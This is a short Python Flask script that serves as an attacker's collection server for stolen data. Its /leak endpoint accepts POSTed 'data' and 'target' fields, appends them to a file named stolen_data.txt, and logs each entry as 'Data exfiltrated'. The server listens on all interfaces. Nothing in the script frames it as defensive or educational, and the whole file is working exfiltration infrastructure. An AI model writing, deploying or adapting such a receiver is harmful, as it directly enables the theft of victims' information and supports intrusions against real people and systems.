from flask import Flask, request

app = Flask(__name__)

@app.route('/leak', methods=['POST'])
def leak():
    data = request.form.get('data')
    target = request.form.get('target')
    with open("stolen_data.txt", "a", encoding="utf-8") as f:
        f.write(f"Target: {target}\n{data}\n{'-'*60}\n")
    print(f"[+] Data exfiltrated from {target}: {data[:100]}...")
    return "OK"

if __name__ == '__main__':
    app.run(host="0.0.0.0", port=5000)
